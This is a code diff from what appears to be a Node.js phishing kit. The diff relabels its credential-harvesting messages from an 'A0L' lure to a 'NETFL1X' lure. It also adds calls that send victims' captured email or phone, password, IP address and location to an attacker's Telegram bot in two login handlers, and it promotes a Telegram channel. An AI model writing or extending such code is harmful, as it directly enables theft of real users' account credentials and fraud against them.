@@ -99,7 +99,7 @@ exports.loginPost2 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | A0L | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | NETFL1X | USER_${ipAddress}\n\n` +
             `👤 RELOGIN INFO\n` +
 			`EMAIL/PHONE      : ${userId}\n` +
 			`PASSWORD         : ${password}\n\n` +
@@ -169,6 +169,10 @@ const sendAPIRequest = async (ipAddress) => {
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 		
+		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
+        
+		
 		res.redirect("/auth/login/4");
 		
 	} catch (error) {
@@ -210,6 +214,9 @@ exports.loginPost4 = async (req, res) => {
 		 `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
+		
+		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
 		
 		res.redirect("/auth/complete");
 
